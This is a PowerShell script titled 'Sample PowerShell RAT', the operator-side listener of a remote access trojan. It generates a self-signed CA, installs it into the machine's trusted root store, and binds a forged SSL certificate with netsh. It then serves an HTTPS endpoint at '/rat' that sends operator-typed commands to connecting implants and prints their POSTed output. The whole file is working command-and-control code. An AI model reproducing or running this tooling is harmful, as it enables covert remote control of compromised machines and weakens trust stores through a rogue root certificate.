# Sample PowerShell RAT
# Casey Smith
# 06-05-2014
# 
####
#
# Create Certificates For SSL, without requiring makecert.exe
# Creates and Trusts a CA, and then Signs Certificaets using that CA for SSL/TLS
#
####


function createCertificate([string] $certSubject, [bool] $isCA)
{
$CAsubject = $certSubject
$dn = new-object -com "X509Enrollment.CX500DistinguishedName"
$dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)


# Create a new Private Key
$key = new-object -com "X509Enrollment.CX509PrivateKey"
$key.ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
# Set CAcert to 1 to be used for Signature
if($isCA)
	{
		$key.KeySpec = 2 
	}
else
	{
		$key.KeySpec = 1
	}
$key.Length = 2048
$key.MachineContext = 1
$key.Create() 
 
# Create Attributes
$serverauthoid = new-object -com "X509Enrollment.CObjectId"
$serverauthoid.InitializeFromValue("1.3.6.1.5.5.7.3.1")
$ekuoids = new-object -com "X509Enrollment.CObjectIds.1"
$ekuoids.add($serverauthoid)
$ekuext = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
$ekuext.InitializeEncode($ekuoids)


$cert = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
$cert.InitializeFromPrivateKey(2, $key, "")
$cert.Subject = $dn
$cert.Issuer = $cert.Subject
$cert.NotBefore = get-date
$cert.NotAfter = $cert.NotBefore.AddDays(90)
$cert.X509Extensions.Add($ekuext)
if ($isCA)
{
	$basicConst = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
	$basicConst.InitializeEncode("true", 1)
	$cert.X509Extensions.Add($basicConst)
}
else
{              
	$signer = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__PoshRAT_Trusted_Root" })
	$signerCertificate =  new-object -com "X509Enrollment.CSignerCertificate"
	$signerCertificate.Initialize(1,0,4, $signer.Thumbprint)
	$cert.SignerCertificate = $signerCertificate
}
$cert.Encode()


$enrollment = new-object -com "X509Enrollment.CX509Enrollment"
$enrollment.InitializeFromRequest($cert)
$certdata = $enrollment.CreateRequest(0)
$enrollment.InstallResponse(2, $certdata, 0, "")


if($isCA)
{              
                                
	# Need a Better way to do this...
	$CACertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__PoshRAT_Trusted_Root" })
	# Install CA Root Certificate
	$StoreScope = "LocalMachine"
	$StoreName = "Root"
	$store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
	$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
	$store.Add($CACertificate)
	$store.Close()
                                
}
else
{
	return (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $CAsubject })
} 
     
}


function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

#Certificate Setup For SSL/TLS
#Create and Install the CACert
$CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__PoshRAT_Trusted_Root"  })
if ($CACertificate -eq $null)
{
createCertificate "__PoshRAT_Trusted_Root" $true
}

$ListenerIP = "127.0.0.1"
$isSSL = $true

$listener = New-Object System.Net.HttpListener

$sslcertfake = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $ListenerIP })
if ($sslcertfake -eq $null)
{
	$sslcertfake =  createCertificate  $ListenerIP $false
}
$sslThumbprint = $sslcertfake.Thumbprint 
$installCert = "netsh http add sslcert ipport=0.0.0.0:8082 certhash=$sslThumbprint appid='{e46ad221-627f-4c05-9bb6-2529ae1fa815}'"
iex $installCert
'SSL Certificates Installed...'
$listener.Prefixes.Add('https://+:8082/') #HTTPS Listener



$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/rat$' ) { # 
        $response.ContentType = 'text/plain'
        $message = Read-Host "PS $hostip>"		
    }		
    

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
